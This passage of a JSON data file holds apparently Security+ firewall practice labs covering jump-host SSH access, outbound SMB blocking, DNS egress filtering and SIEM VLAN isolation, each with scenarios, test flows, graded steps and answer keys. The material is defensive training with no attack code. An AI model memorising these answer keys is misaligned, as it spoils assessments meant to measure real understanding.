          "proto": "any",
          "src": "10.50.0.0/16",
          "dst": "any",
          "port": "any"
        },
        {
          "id": "deny",
          "action": "deny",
          "proto": "any",
          "src": "any",
          "dst": "any",
          "port": "any"
        }
      ],
      "flows": [
        {
          "name": "jump host ssh to a switch",
          "proto": "tcp",
          "src": "10.50.10.5",
          "dst": "10.50.99.11",
          "port": 22,
          "expect": "allow"
        },
        {
          "name": "jump host to a web console blocked",
          "proto": "tcp",
          "src": "10.50.10.5",
          "dst": "10.50.99.20",
          "port": 443,
          "expect": "deny"
        },
        {
          "name": "IT workstation ssh blocked",
          "proto": "tcp",
          "src": "10.50.10.40",
          "dst": "10.50.99.11",
          "port": 22,
          "expect": "deny"
        },
        {
          "name": "staff to a hypervisor console blocked",
          "proto": "tcp",
          "src": "10.50.20.30",
          "dst": "10.50.99.20",
          "port": 443,
          "expect": "deny"
        },
        {
          "name": "staff browse the web",
          "proto": "tcp",
          "src": "10.50.20.30",
          "dst": "203.0.113.80",
          "port": 443,
          "expect": "allow"
        },
        {
          "name": "internet to management blocked",
          "proto": "tcp",
          "src": "203.0.113.80",
          "dst": "10.50.99.11",
          "port": 22,
          "expect": "deny"
        }
      ],
      "shadowTable": {
        "rules": [
          {
            "id": "itSsh",
            "action": "allow",
            "proto": "tcp",
            "src": "10.50.10.0/24",
            "dst": "10.50.99.0/24",
            "port": 22
          },
          {
            "id": "jump",
            "action": "allow",
            "proto": "tcp",
            "src": "10.50.10.5/32",
            "dst": "10.50.99.0/24",
            "port": 22
          },
          {
            "id": "noMgmt",
            "action": "deny",
            "proto": "any",
            "src": "10.50.0.0/16",
            "dst": "10.50.99.0/24",
            "port": "any"
          },
          {
            "id": "corp",
            "action": "allow",
            "proto": "any",
            "src": "10.50.0.0/16",
            "dst": "any",
            "port": "any"
          },
          {
            "id": "deny",
            "action": "deny",
            "proto": "any",
            "src": "any",
            "dst": "any",
            "port": "any"
          }
        ],
        "shadowedRuleId": "jump"
      }
    },
    "steps": [
      {
        "id": "s1",
        "type": "configure",
        "points": 1,
        "prompt": "Build the jump-host rule into the management network.",
        "explanation": "Allow the jump host’s /32 on TCP 22 (SSH). The IT admin VLAN /24 is the trap: it lets every IT workstation skip the jump host, and with it the MFA and session recording. Telnet (23) sends credentials in cleartext, 443 is the web console the policy leaves closed, and RDP (3389) is for Windows desktops, not switch and hypervisor command lines.",
        "payload": {
          "slots": [
            {
              "id": "action",
              "label": "Action",
              "options": [
                {
                  "id": "a",
                  "text": "allow"
                },
                {
                  "id": "d",
                  "text": "deny"
                }
              ]
            },
            {
              "id": "src",
              "label": "Source",
              "options": [
                {
                  "id": "corp",
                  "text": "10.50.0.0/16"
                },
                {
                  "id": "itv",
                  "text": "10.50.10.0/24"
                },
                {
                  "id": "jump",
                  "text": "10.50.10.5/32"
                }
              ]
            },
            {
              "id": "svc",
              "label": "Service",
              "options": [
                {
                  "id": "telnet",
                  "text": "TCP 23"
                },
                {
                  "id": "https",
                  "text": "TCP 443"
                },
                {
                  "id": "ssh",
                  "text": "TCP 22"
                },
                {
                  "id": "rdp",
                  "text": "TCP 3389"
                }
              ]
            }
          ]
        },
        "answer": {
          "slots": {
            "action": "a",
            "src": "jump",
            "svc": "ssh"
          }
        }
      },
      {
        "id": "s2",
        "type": "configure",
        "points": 1,
        "prompt": "Build the rule that keeps everyone else out of the management network.",
        "explanation": "Deny the whole corporate 10.50.0.0/16 on any service. Denying only the staff VLAN leaves the IT workstations a direct path in. Denying only SSH leaves the web consoles open to every desk.",
        "payload": {
          "slots": [
            {
              "id": "action",
              "label": "Action",
              "options": [
                {
                  "id": "a",
                  "text": "allow"
                },
                {
                  "id": "d",
                  "text": "deny"
                }
              ]
            },
            {
              "id": "src",
              "label": "Source",
              "options": [
                {
                  "id": "staff",
                  "text": "10.50.20.0/24"
                },
                {
                  "id": "corp",
                  "text": "10.50.0.0/16"
                },
                {
                  "id": "itv",
                  "text": "10.50.10.0/24"
                }
              ]
            },
            {
              "id": "svc",
              "label": "Service",
              "options": [
                {
                  "id": "ssh",
                  "text": "TCP 22"
                },
                {
                  "id": "any",
                  "text": "any"
                },
                {
                  "id": "https",
                  "text": "TCP 443"
                }
              ]
            }
          ]
        },
        "answer": {
          "slots": {
            "action": "d",
            "src": "corp",
            "svc": "any"
          }
        }
      },
      {
        "id": "s3",
        "type": "order",
        "points": 1,
        "prompt": "Arrange the four rules. The firewall reads from the top and stops at the first match.",
        "explanation": "Jump-host SSH, the management block, the corporate allow, then the catch-all. The jump host sits inside 10.50.0.0/16, so its SSH also matches the block, and the exception has to come first. The block has to sit above the corporate allow, which matches traffic into the management network too. The catch-all goes last.",
        "payload": {
          "items": [
            {
              "id": "corp",
              "label": "Allow corporate users everything else"
            },
            {
              "id": "noMgmt",
              "label": "Block the corporate network from the management network"
            },
            {
              "id": "deny",
              "label": "Drop anything left over"
            },
            {
              "id": "jump",
              "label": "Allow SSH from the jump host into the management network"
            }
          ]
        },
        "answer": {
          "correctOrder": [
            "jump",
            "noMgmt",
            "corp",
            "deny"
          ]
        }
      },
      {
        "id": "s4",
        "type": "analyze",
        "points": 1,
        "prompt": "Three weeks later, the live table reads as follows, top rule first. Which rule can never fire?",
        "explanation": "Rule 2 never fires. The jump host 10.50.10.5 is inside the IT admin VLAN, so its SSH sessions match rule 1 first. A redundant allow breaks nothing on its own; the real problem is rule 1. Every IT workstation can now SSH straight into the management network, with no MFA and no session recording. Rule 3 still fires for staff and for non-SSH traffic, so it is not the answer. Fix: delete rule 1.",
        "payload": {
          "multi": false,
          "lines": [
            {
              "id": "l1",
              "text": "1 · Allow · IT admin VLAN → Mgmt network · SSH"
            },
            {
              "id": "l2",
              "text": "2 · Allow · Jump host → Mgmt network · SSH"
            },
            {
              "id": "l3",
              "text": "3 · Deny · Corporate network → Mgmt network · any service"
            },
            {
              "id": "l4",
              "text": "4 · Allow · Corporate network → Any · any service"
            },
            {
              "id": "l5",
              "text": "5 · Deny · Any → Any · any service"
            }
          ]
        },
        "answer": {
          "selected": [
            "l2"
          ]
        }
      }
    ]
  },

  {
    "id": "sp-fw-03",
    "cert": "secplus",
    "objective": "4.5",
    "topic": "Egress filtering",
    "title": "Close outbound SMB at the branch",
    "estMinutes": 5,
    "archetype": "firewall",
    "scenario": "The Leeds branch (10.40.0.0/16) reaches head office (10.10.0.0/16) over a site-to-site IPsec tunnel that runs through the branch firewall. Last month a phishing link made a branch laptop connect to an attacker’s file share on the internet, and Windows handed over the user’s hashed credentials while trying to log in. The ticket: SMB from the branch to any destination is blocked; the branch’s other outbound traffic carries on as before; branch users can still map drives on the head-office file server 10.10.5.20; anything not covered is dropped. NetBIOS over TCP/IP is already disabled on every branch laptop by Group Policy, so Windows only ever uses SMB’s direct-hosted port.",
    "assets": {
      "reference": {
        "kind": "network",
        "given": {
          "site": "Leeds branch · FW-LEEDS",
          "engine": "first match wins, implicit deny"
        },
        "devices": [
          {
            "id": "branch",
            "label": "Branch LAN",
            "type": "pc",
            "zone": "branch",
            "ip": "10.40.0.0/16",
            "x": 0,
            "y": 1
          },
          {
            "id": "fw",
            "label": "FW-LEEDS",
            "type": "firewall",
            "ip": "top-down",
            "x": 2,
            "y": 1
          },
          {
            "id": "fs",
            "label": "HQ file server",
            "type": "server",
            "zone": "head office",
            "ip": "10.10.5.20",
            "x": 4,
            "y": 0
          },
          {
            "id": "net",
            "label": "Internet",
            "type": "cloud",
            "zone": "untrusted",
            "ip": "any",
            "x": 4,
            "y": 2
          }
        ],
        "links": [
          {
            "from": "branch",
            "to": "fw"
          },
          {
            "from": "fw",
            "to": "fs"
          },
          {
            "from": "fw",
            "to": "net"
          }
        ]
      }
    },
    "fwSpec": {
      "rules": [
        {
          "id": "hqSmb",
          "action": "allow",
          "proto": "tcp",
          "src": "10.40.0.0/16",
          "dst": "10.10.5.20/32",
          "port": 445
        },
        {
          "id": "noSmb",
          "action": "deny",
          "proto": "tcp",
          "src": "10.40.0.0/16",
          "dst": "any",
          "port": 445
        },
        {
          "id": "branchOut",
          "action": "allow",
          "proto": "any",
          "src": "10.40.0.0/16",
          "dst": "any",
          "port": "any"
        },
        {
          "id": "deny",
          "action": "deny",
          "proto": "any",
          "src": "any",
          "dst": "any",
          "port": "any"
        }
      ],
      "flows": [
        {
          "name": "branch maps a drive on the HQ file server",
          "proto": "tcp",
          "src": "10.40.3.25",
          "dst": "10.10.5.20",
          "port": 445,
          "expect": "allow"
        },
        {
          "name": "branch smb to the internet blocked",
          "proto": "tcp",
          "src": "10.40.3.25",
          "dst": "198.51.100.66",
          "port": 445,
          "expect": "deny"
        },
        {
          "name": "branch smb to another HQ host blocked",
          "proto": "tcp",
          "src": "10.40.3.25",
          "dst": "10.10.7.9",
          "port": 445,
          "expect": "deny"
        },
        {
          "name": "branch web traffic",
          "proto": "tcp",
          "src": "10.40.3.25",
          "dst": "203.0.113.80",
          "port": 443,
          "expect": "allow"
        },
        {
          "name": "unsolicited inbound dropped",
          "proto": "tcp",
          "src": "198.51.100.66",
          "dst": "10.40.3.25",
          "port": 445,
          "expect": "deny"
        }
      ],
      "shadowTable": {
        "rules": [
          {
            "id": "noSmb",
            "action": "deny",
            "proto": "tcp",
            "src": "10.40.0.0/16",
            "dst": "any",
            "port": 445
          },
          {
            "id": "hqSmb",
            "action": "allow",
            "proto": "tcp",
            "src": "10.40.0.0/16",
            "dst": "10.10.5.20/32",
            "port": 445
          },
          {
            "id": "branchOut",
            "action": "allow",
            "proto": "any",
            "src": "10.40.0.0/16",
            "dst": "any",
            "port": "any"
          },
          {
            "id": "deny",
            "action": "deny",
            "proto": "any",
            "src": "any",
            "dst": "any",
            "port": "any"
          }
        ],
        "shadowedRuleId": "hqSmb"
      }
    },
    "steps": [
      {
        "id": "s1",
        "type": "configure",
        "points": 1,
        "prompt": "Build the rule that blocks SMB leaving the branch.",
        "explanation": "Deny the branch to any destination on TCP 445, the port modern SMB uses. Any is the point: the attacker’s share could be anywhere. A head-office destination would leave the internet open, and a /32 for the file server would block the one share the branch needs and nothing else. TCP 389 is LDAP and TCP 3389 is RDP. The legacy NetBIOS ports 137 to 139 would also need blocking on a network that still runs NetBIOS; this branch has it switched off, so 445 is the only SMB path left.",
        "payload": {
          "slots": [
            {
              "id": "action",
              "label": "Action",
              "options": [
                {
                  "id": "a",
                  "text": "allow"
                },
                {
                  "id": "d",
                  "text": "deny"
                }
              ]
            },
            {
              "id": "dst",
              "label": "Destination",
              "options": [
                {
                  "id": "fs",
                  "text": "10.10.5.20/32"
                },
                {
                  "id": "hq",
                  "text": "10.10.0.0/16"
                },
                {
                  "id": "any",
                  "text": "any"
                }
              ]
            },
            {
              "id": "svc",
              "label": "Service",
              "options": [
                {
                  "id": "ldap",
                  "text": "TCP 389"
                },
                {
                  "id": "rdp",
                  "text": "TCP 3389"
                },
                {
                  "id": "smb",
                  "text": "TCP 445"
                }
              ]
            }
          ]
        },
        "answer": {
          "slots": {
            "action": "d",
            "dst": "any",
            "svc": "smb"
          }
        }
      },
      {
        "id": "s2",
        "type": "configure",
        "points": 1,
        "prompt": "Build the exception for the head-office file server.",
        "explanation": "Allow the branch, 10.40.0.0/16, to the file server’s /32 only. Opening SMB to all of 10.10.0.0/16 would give malware on a branch laptop SMB to every head-office host, which is how worms like WannaCry spread. A /24 source would cut every other branch subnet off from its shares, and a head-office source puts the exception on traffic that never crosses this firewall.",
        "payload": {
          "slots": [
            {
              "id": "action",
              "label": "Action",
              "options": [
                {
                  "id": "a",
                  "text": "allow"
                },
                {
                  "id": "d",
                  "text": "deny"
                }
              ]
            },
            {
              "id": "src",
              "label": "Source",
              "options": [
                {
                  "id": "floor",
                  "text": "10.40.3.0/24"
                },
                {
                  "id": "branch",
                  "text": "10.40.0.0/16"
                },
                {
                  "id": "hq",
                  "text": "10.10.0.0/16"
                }
              ]
            },
            {
              "id": "dst",
              "label": "Destination",
              "options": [
                {
                  "id": "hq",
                  "text": "10.10.0.0/16"
                },
                {
                  "id": "any",
                  "text": "any"
                },
                {
                  "id": "fs",
                  "text": "10.10.5.20/32"
                }
              ]
            }
          ]
        },
        "answer": {
          "slots": {
            "action": "a",
            "src": "branch",
            "dst": "fs"
          }
        }
      },
      {
        "id": "s3",
        "type": "order",
        "points": 1,
        "prompt": "Arrange the four rules. The firewall reads from the top and stops at the first match.",
        "explanation": "File-server exception, SMB block, branch outbound, catch-all. The file server is part of any, so the exception has to sit above the block or every mapped drive fails. The block has to sit above the general outbound rule, which also matches SMB. The catch-all goes last.",
        "payload": {
          "items": [
            {
              "id": "noSmb",
              "label": "Block SMB from the branch to everywhere else"
            },
            {
              "id": "deny",
              "label": "Drop anything not covered"
            },
            {
              "id": "branchOut",
              "label": "Allow the branch’s other outbound traffic"
            },
            {
              "id": "hqSmb",
              "label": "Allow branch users SMB to the head-office file server"
            }
          ]
        },
        "answer": {
          "correctOrder": [
            "hqSmb",
            "noSmb",
            "branchOut",
            "deny"
          ]
        }
      },
      {
        "id": "s4",
        "type": "analyze",
        "points": 1,
        "prompt": "The live table after the change window reads as follows, top rule first. Which rule can never fire?",
        "explanation": "Rule 2 never fires. The head-office file server is part of Any, so every mapped-drive connection matches rule 1’s deny first, and users lose their shares. This is the “put the denies first” habit, which only works when no allow is meant to carve an exception out of the deny. Rule 1 is the cause, but it fires on every SMB attempt, so it is not the answer. Fix: move rule 2 above rule 1.",
        "payload": {
          "multi": false,
          "lines": [
            {
              "id": "l1",
              "text": "1 · Deny · Branch LAN → Any · SMB"
            },
            {
              "id": "l2",
              "text": "2 · Allow · Branch LAN → HQ file server · SMB"
            },
            {
              "id": "l3",
              "text": "3 · Allow · Branch LAN → Any · any service"
            },
            {
              "id": "l4",
              "text": "4 · Deny · Any → Any · any service"
            }
          ]
        },
        "answer": {
          "selected": [
            "l2"
          ]
        }
      }
    ]
  },

  {
    "id": "sp-fw-04",
    "cert": "secplus",
    "objective": "4.5",
    "topic": "DNS filtering",
    "title": "Rein in DNS at the edge firewall",
    "estMinutes": 5,
    "archetype": "firewall",
    "scenario": "Kestrel Labs runs a filtering DNS resolver at 10.30.1.53 that refuses to resolve known-malicious domains. Clients on the LAN (10.30.0.0/16) query it directly without crossing the edge firewall, and it forwards to its upstream servers over standard DNS. Two infected laptops ignored it and queried outside resolvers, and one sent stolen data straight to an attacker-run DNS server on port 53. The edge-firewall ticket: the LAN keeps its other outbound access; no LAN host may send DNS to the internet; the resolver is the one exception; anything else is dropped.",
    "assets": {
      "reference": {
        "kind": "network",
        "given": {
          "site": "Kestrel Labs · FW-EDGE",
          "engine": "first match wins, implicit deny"
        },
        "devices": [
          {
            "id": "res",
            "label": "DNS resolver",
            "type": "server",
            "zone": "lan",
            "ip": "10.30.1.53",
            "x": 0,
            "y": 0
          },
          {
            "id": "lap",
            "label": "User laptops",
            "type": "pc",
            "zone": "lan",
            "ip": "10.30.8.0/24",
            "x": 0,
            "y": 1
          },
          {
            "id": "fw",
            "label": "FW-EDGE",
            "type": "firewall",
            "ip": "top-down",
            "x": 2,
            "y": 1
          },
          {
            "id": "net",
            "label": "Internet",
            "type": "cloud",
            "zone": "untrusted",
            "ip": "any",
            "x": 4,
            "y": 1
          }
        ],
        "links": [
          {
            "from": "res",
            "to": "fw"
          },
          {
            "from": "lap",
            "to": "fw"
          },
          {
            "from": "fw",
            "to": "net"
          }
        ]
      }
    },
    "fwSpec": {
      "rules": [
        {
          "id": "resolver",
          "action": "allow",
          "proto": "any",
          "src": "10.30.1.53/32",
          "dst": "any",
          "port": 53
        },
        {
          "id": "noDns",
          "action": "deny",
          "proto": "any",
          "src": "10.30.0.0/16",
          "dst": "any",
          "port": 53
        },
        {
          "id": "lanOut",
          "action": "allow",
          "proto": "any",
          "src": "10.30.0.0/16",
          "dst": "any",
          "port": "any"
        },
        {
          "id": "deny",
          "action": "deny",
          "proto": "any",
          "src": "any",
          "dst": "any",
          "port": "any"
        }
      ],
      "flows": [
        {
          "name": "resolver forwards a query",
          "proto": "udp",
          "src": "10.30.1.53",
          "dst": "198.51.100.53",
          "port": 53,
          "expect": "allow"
        },
        {
          "name": "resolver retries a large reply over tcp",
          "proto": "tcp",
          "src": "10.30.1.53",
          "dst": "198.51.100.53",
          "port": 53,
          "expect": "allow"
        },
        {
          "name": "laptop queries an outside resolver",
          "proto": "udp",
          "src": "10.30.8.21",
          "dst": "203.0.113.53",
          "port": 53,
          "expect": "deny"
        },
        {
          "name": "laptop sends dns over tcp",
          "proto": "tcp",
          "src": "10.30.8.21",
          "dst": "203.0.113.53",
          "port": 53,
          "expect": "deny"
        },
        {
          "name": "laptop browses the web",
          "proto": "tcp",
          "src": "10.30.8.21",
          "dst": "203.0.113.80",
          "port": 443,
          "expect": "allow"
        },
        {
          "name": "unsolicited inbound dropped",
          "proto": "udp",
          "src": "203.0.113.53",
          "dst": "10.30.1.53",
          "port": 53,
          "expect": "deny"
        }
      ],
      "shadowTable": {
        "rules": [
          {
            "id": "resolver",
            "action": "allow",
            "proto": "any",
            "src": "10.30.1.53/32",
            "dst": "any",
            "port": 53
          },
          {
            "id": "lanOut",
            "action": "allow",
            "proto": "any",
            "src": "10.30.0.0/16",
            "dst": "any",
            "port": "any"
          },
          {
            "id": "noDns",
            "action": "deny",
            "proto": "any",
            "src": "10.30.0.0/16",
            "dst": "any",
            "port": 53
          },
          {
            "id": "deny",
            "action": "deny",
            "proto": "any",
            "src": "any",
            "dst": "any",
            "port": "any"
          }
        ],
        "shadowedRuleId": "noDns"
      }
    },
    "steps": [
      {
        "id": "s1",
        "type": "configure",
        "points": 1,
        "prompt": "Build the rule for the resolver’s upstream queries.",
        "explanation": "Allow the resolver’s /32 on port 53 over both transports. Ordinary queries use UDP 53, and TCP 53 carries replies too large for UDP and zone transfers, so a resolver needs both. TCP 853 is DNS over TLS, which this resolver does not use. UDP 67 is DHCP and UDP 123 is NTP. A /16 source would hand the exception to every laptop.",
        "payload": {
          "slots": [
            {
              "id": "action",
              "label": "Action",
              "options": [
                {
                  "id": "a",
                  "text": "allow"
                },
                {
                  "id": "d",
                  "text": "deny"
                }
              ]
            },
            {
              "id": "src",
              "label": "Source",
              "options": [
                {
                  "id": "lan",
                  "text": "10.30.0.0/16"
                },
                {
                  "id": "res",
                  "text": "10.30.1.53/32"
                },
                {
                  "id": "any",
                  "text": "any"
                }
              ]
            },
            {
              "id": "svc",
              "label": "Service",
              "options": [
                {
                  "id": "dot",
                  "text": "TCP 853"
                },
                {
                  "id": "dns",
                  "text": "TCP/UDP 53"
                },
                {
                  "id": "dhcp",
                  "text": "UDP 67"
                },
                {
                  "id": "ntp",
                  "text": "UDP 123"
                }
              ]
            }
          ]
        },
        "answer": {
          "slots": {
            "action": "a",
            "src": "res",
            "svc": "dns"
          }
        }
      },
      {
        "id": "s2",
        "type": "configure",
        "points": 1,
        "prompt": "Build the rule that stops every other LAN host sending DNS out.",
        "explanation": "Deny the whole 10.30.0.0/16 on TCP and UDP 53. Blocking only UDP 53 leaves TCP 53 open, and any client can send its queries over TCP. Blocking only the laptop subnet leaves every other subnet free to use outside resolvers. DNS over HTTPS on 443 is a separate bypass, handled by blocking known DoH endpoints or by browser policy, not by this rule.",
        "payload": {
          "slots": [
            {
              "id": "action",
              "label": "Action",
              "options": [
                {
                  "id": "a",
                  "text": "allow"
                },
                {
                  "id": "d",
                  "text": "deny"
                }
              ]
            },
            {
              "id": "src",
              "label": "Source",
              "options": [
                {
                  "id": "lap",
                  "text": "10.30.8.0/24"
                },
                {
                  "id": "lan",
                  "text": "10.30.0.0/16"
                },
                {
                  "id": "res",
                  "text": "10.30.1.53/32"
                }
              ]
            },
            {
              "id": "svc",
              "label": "Service",
              "options": [
                {
                  "id": "udp",
                  "text": "UDP 53"
                },
                {
                  "id": "dns",
                  "text": "TCP/UDP 53"
                },
                {
                  "id": "https",
                  "text": "TCP 443"
                }
              ]
            }
          ]
        },
        "answer": {
          "slots": {
            "action": "d",
            "src": "lan",
            "svc": "dns"
          }
        }
      },
      {
        "id": "s3",
        "type": "order",
        "points": 1,
        "prompt": "Arrange the four rules. The firewall reads from the top and stops at the first match.",
        "explanation": "Resolver exception, DNS block, LAN outbound, catch-all. The resolver sits inside 10.30.0.0/16, so its queries also match the block, and the exception has to come first or all name resolution stops. The block has to sit above the LAN outbound rule, which matches DNS too. The catch-all goes last.",
        "payload": {
          "items": [
            {
              "id": "lanOut",
              "label": "Allow the LAN its other outbound traffic"
            },
            {
              "id": "noDns",
              "label": "Block DNS from every other LAN host"
            },
            {
              "id": "deny",
              "label": "Drop anything else"
            },
            {
              "id": "resolver",
              "label": "Allow the resolver to send DNS to the internet"
            }
          ]
        },
        "answer": {
          "correctOrder": [
            "resolver",
            "noDns",
            "lanOut",
            "deny"
          ]
        }
      },
      {
        "id": "s4",
        "type": "analyze",
        "points": 1,
        "prompt": "Six weeks later the live table reads as follows, top rule first. Which rule can never fire?",
        "explanation": "Rule 3 never fires. Rule 2 lets the LAN send anything anywhere, DNS included, so a laptop’s query to an outside resolver is allowed at rule 2 and rule 3 is never read. Malware can skip the filtering resolver and its query logs again, and send DNS straight to an attacker's server. Rule 2 is the cause, but it fires all day, so it is not the answer, and rule 1 still fires for the resolver. Fix: move rule 3 above rule 2.",
        "payload": {
          "multi": false,
          "lines": [
            {
              "id": "l1",
              "text": "1 · Allow · DNS resolver → Any · DNS"
            },
            {
              "id": "l2",
              "text": "2 · Allow · LAN → Any · any service"
            },
            {
              "id": "l3",
              "text": "3 · Deny · LAN → Any · DNS"
            },
            {
              "id": "l4",
              "text": "4 · Deny · Any → Any · any service"
            }
          ]
        },
        "answer": {
          "selected": [
            "l3"
          ]
        }
      }
    ]
  },

  {
    "id": "sp-fw-05",
    "cert": "secplus",
    "objective": "3.2",
    "topic": "Security zones",
    "title": "Move the SIEM into its own security zone",
    "estMinutes": 5,
    "archetype": "firewall",
    "scenario": "Wrenfield Council is moving its SIEM into a dedicated security VLAN (10.41.7.0/24): the log collector is 10.41.7.20 and the log archive is 10.41.7.30. The core firewall routes between the VLANs and out to the internet. Nothing else may open a connection into the security VLAN, because an attacker who gets in there can quietly delete the evidence. The servers in the server VLAN (10.41.20.0/24) will forward their logs to the collector as syslog over TLS, so the stream cannot be read or altered on the way. The rest of the council network (10.41.0.0/16) keeps its normal access, and anything else is dropped.",
    "assets": {
      "reference": {
        "kind": "network",
        "given": {
          "site": "Wrenfield Council · FW-CORE",
          "engine": "first match wins, implicit deny"
        },
        "devices": [
          {
            "id": "srv",
            "label": "Server VLAN",
            "type": "server",
            "zone": "servers",
            "ip": "10.41.20.0/24",
            "x": 0,
            "y": 0
          },
          {
            "id": "staff",
            "label": "Staff PCs",
            "type": "pc",
            "zone": "staff",
            "ip": "10.41.30.0/24",
            "x": 0,
            "y": 2
          },
          {
            "id": "fw",
            "label": "FW-CORE",
            "type": "firewall",
            "ip": "top-down",
            "x": 2,
            "y": 1
          },
          {
            "id": "col",
            "label": "SIEM collector",
            "type": "server",
            "zone": "security",
            "ip": "10.41.7.20",
            "x": 4,
            "y": 0
          },
          {
            "id": "arc",
            "label": "Log archive",
            "type": "server",
            "zone": "security",
            "ip": "10.41.7.30",
            "x": 4,
            "y": 1
          },
          {
            "id": "net",
            "label": "Internet",
            "type": "cloud",
            "ip": "any",
            "x": 4,
            "y": 2
          }
        ],
        "links": [
          {
            "from": "srv",
            "to": "fw"
          },
          {
            "from": "staff",
            "to": "fw"
          },
          {
            "from": "fw",
            "to": "col"
          },
          {
            "from": "fw",
            "to": "arc"
          },
          {
            "from": "fw",
            "to": "net"
          }
        ]
      }
    },
    "fwSpec": {
      "rules": [
        {
          "id": "logs",
          "action": "allow",
          "proto": "tcp",
          "src": "10.41.20.0/24",
          "dst": "10.41.7.20/32",
          "port": 6514
        },
        {
          "id": "noSec",
          "action": "deny",
          "proto": "any",
          "src": "any",
          "dst": "10.41.7.0/24",
          "port": "any"
        },
        {
          "id": "council",
          "action": "allow",
          "proto": "any",
          "src": "10.41.0.0/16",
          "dst": "any",
          "port": "any"
        },
        {
          "id": "deny",
          "action": "deny",
          "proto": "any",
          "src": "any",
          "dst": "any",
          "port": "any"
        }
      ],
      "flows": [
        {
          "name": "server forwards logs over tls",
          "proto": "tcp",
          "src": "10.41.20.14",
          "dst": "10.41.7.20",
          "port": 6514,
          "expect": "allow"
        },
        {
          "name": "server plaintext syslog blocked",
          "proto": "udp",
          "src": "10.41.20.14",
          "dst": "10.41.7.20",
          "port": 514,
          "expect": "deny"
        },
        {
          "name": "staff pc to the log archive blocked",
          "proto": "tcp",
          "src": "10.41.30.50",
          "dst": "10.41.7.30",
          "port": 445,
          "expect": "deny"
        },
        {
          "name": "staff pc browses the web",
          "proto": "tcp",
          "src": "10.41.30.50",
          "dst": "203.0.113.80",
          "port": 443,
          "expect": "allow"
        },
        {
          "name": "internet to the collector blocked",
          "proto": "tcp",
          "src": "203.0.113.80",
          "dst": "10.41.7.20",
          "port": 6514,
          "expect": "deny"
        },
        {
          "name": "internet to a staff pc dropped",
          "proto": "tcp",
          "src": "203.0.113.80",
          "dst": "10.41.30.50",
          "port": 3389,
          "expect": "deny"
        }
      ],
      "shadowTable": {
        "rules": [
          {
            "id": "noSec",
            "action": "deny",
            "proto": "any",
            "src": "any",
            "dst": "10.41.7.0/24",
            "port": "any"
          },
          {
            "id": "council",
            "action": "allow",
            "proto": "any",
            "src": "10.41.0.0/16",
            "dst": "any",
            "port": "any"
          },
          {
            "id": "logs",
            "action": "allow",
            "proto": "tcp",
            "src": "10.41.20.0/24",
            "dst": "10.41.7.20/32",
            "port": 6514
          },
          {
            "id": "deny",
            "action": "deny",
            "proto": "any",
            "src": "any",
            "dst": "any",
            "port": "any"
          }
        ],
        "shadowedRuleId": "logs"
      }
    },
    "steps": [
      {
        "id": "s1",
        "type": "configure",
        "points": 1,
        "prompt": "Build the log-forwarding rule from the server VLAN to the collector.",
        "explanation": "Allow the server VLAN to the collector on TCP 6514, the registered port for syslog over TLS. UDP 514 is classic syslog: cleartext, unauthenticated and easy to spoof, which is what this ticket retires. UDP 162 is SNMP traps and TCP 443 is HTTPS. A source of the whole council network, or any, would let every PC talk to the collector.",
        "payload": {
          "slots": [
            {
              "id": "action",
              "label": "Action",
              "options": [
                {
                  "id": "a",
                  "text": "allow"
                },
                {
                  "id": "d",
                  "text": "deny"
                }
              ]
            },
            {
              "id": "src",
              "label": "Source",
              "options": [
                {
                  "id": "any",
                  "text": "any"
                },
                {
                  "id": "council",
                  "text": "10.41.0.0/16"
                },
                {
                  "id": "srv",
                  "text": "10.41.20.0/24"
                }
              ]
            },
            {
              "id": "svc",
              "label": "Service",
              "options": [
                {
                  "id": "syslog",
                  "text": "UDP 514"
                },
                {
                  "id": "trap",
                  "text": "UDP 162"
                },
                {
                  "id": "tls",
                  "text": "TCP 6514"
                },
                {
                  "id": "https",
                  "text": "TCP 443"
                }
              ]
            }
          ]
        },
        "answer": {
          "slots": {
            "action": "a",
            "src": "srv",
            "svc": "tls"
          }
        }
      },
      {
        "id": "s2",
        "type": "configure",
        "points": 1,
        "prompt": "Build the rule that keeps everything else out of the security VLAN.",
        "explanation": "Deny any source to the whole 10.41.7.0/24 on any service. A /32 for the collector would leave the log archive open, and the archive holds the evidence. Denying only the syslog port leaves every other service in the VLAN reachable.",
        "payload": {
          "slots": [
            {
              "id": "action",
              "label": "Action",
              "options": [
                {
                  "id": "a",
                  "text": "allow"
                },
                {
                  "id": "d",
                  "text": "deny"
                }
              ]
            },
            {
              "id": "dst",
              "label": "Destination",
              "options": [
                {
                  "id": "col",
                  "text": "10.41.7.20/32"
                },
                {
                  "id": "sec",
                  "text": "10.41.7.0/24"
                },
                {
                  "id": "council",
                  "text": "10.41.0.0/16"
                }
              ]
            },
            {
              "id": "svc",
              "label": "Service",
              "options": [
                {
                  "id": "any",
                  "text": "any"
                },
                {
                  "id": "syslog",
                  "text": "UDP 514"
                },
                {
                  "id": "tls",
                  "text": "TCP 6514"
                }
              ]
            }
          ]
        },
        "answer": {
          "slots": {
            "action": "d",
            "dst": "sec",
            "svc": "any"
          }
        }
      },
      {
        "id": "s3",
        "type": "order",
        "points": 1,
        "prompt": "Arrange the four rules. The firewall reads from the top and stops at the first match.",
        "explanation": "Log-forwarding allow, security-VLAN block, council allow, catch-all. The collector lives inside the security VLAN, so log traffic matches the block too, and the allow has to sit above it. The block has to sit above the council allow, which matches traffic into the security VLAN from every council PC. The catch-all goes last.",
        "payload": {
          "items": [
            {
              "id": "noSec",
              "label": "Block every other connection into the security VLAN"
            },
            {
              "id": "deny",
              "label": "Drop anything else"
            },
            {
              "id": "council",
              "label": "Allow the council network its normal access"
            },
            {
              "id": "logs",
              "label": "Allow the server VLAN to forward logs to the collector"
            }
          ]
        },
        "answer": {
          "correctOrder": [
            "logs",
            "noSec",
            "council",
            "deny"
          ]
        }
      },
      {
        "id": "s4",
        "type": "analyze",
        "points": 1,
        "prompt": "The live table after a hardening change reads as follows, top rule first. Which rule can never fire?",
        "explanation": "Rule 3 never fires. The collector is inside the security VLAN, so every log connection matches rule 1’s deny first. The SIEM goes quiet while every server looks healthy, a detection blind spot that nothing alerts on unless someone watches for missing logs. Rule 2 is not dead: it still carries staff traffic to the internet. Fix: move rule 3 above rule 1.",
        "payload": {
          "multi": false,
          "lines": [
            {
              "id": "l1",
              "text": "1 · Deny · Any → Security VLAN · any service"
            },
            {
              "id": "l2",
              "text": "2 · Allow · Council network → Any · any service"
            },
            {
              "id": "l3",
              "text": "3 · Allow · Server VLAN → SIEM collector · syslog over TLS"
            },
            {
              "id": "l4",
              "text": "4 · Deny · Any → Any · any service"
            }
          ]
        },
        "answer": {
          "selected": [
            "l3"
          ]
        }
      }
    ]
  },

  {
    "id": "sp-fw-06",
